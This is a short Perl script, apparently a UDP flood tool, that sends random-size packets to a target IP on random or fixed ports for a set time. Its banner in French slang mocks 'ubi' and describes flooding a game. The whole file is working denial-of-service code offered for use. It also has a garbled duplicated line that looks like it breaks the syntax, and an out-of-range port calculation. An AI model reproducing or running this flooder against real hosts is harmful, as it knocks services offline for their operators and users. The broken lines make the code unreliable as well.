#!/usr/bin/perl

##
# Fuck ubi
##

use Socket;
use strict;

my ($ip,$port,$boyut,$saniye) = @ARGV;

my ($iaddr,$bitissure,$pboyut,$pport);

$iaddr = inet_aton("$ip") or die "c inco frere. $ip\n";
$bitissure = time() + ($saniye ? $saniye : 99999999);
socket(flood, PF_INET, SOCK_DGRAM, 17);

printf "^[[1;34m>>sc LA-BAC-63-off\n";
printf "^[[1;35m>>
 .oPYo.            .oo       o    o       .oPYo.        o    o
 8   `8           .P 8       8b   8       8    8        `b  d'
o8YooP'          .P  8       8`b  8       8              `bd'
 8   `b ooooo   oPooo8 ooooo 8 `b 8 ooooo 8   oo ooooo   .PY.
 8    8        .P    8       8  `b8       8    8        .P  Y.
 8oooP'       .P     8       8   `8       `YooP8       .P    Y.

.......:..:::..::..:::..:::::..::::..::..:::....:.....:..:::..
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::╚═╝
\n\n\n";

 print           "              hagarage de l'ip : $ip
                        ez du port " .
        ($port ? $port : "port") ." ".($saniye ? "temps" : "
LE GADJO SANS YEUX  ") . "\n";
        ($port ? $port : "port") ." ".($saniye ? "time" : "
LE GADJO SANS YEUX  ") . "\n";
        print "stop avec Ctrl-C\n" unless $saniye;
        print "Deploiment data udp pour ce jeu de merde\n" unless $saniye;
for (;time() <= $bitissure;) {
  $pboyut = $boyut ? $boyut : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(6550000))+1;

  send(flood, pack("a$pboyut","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
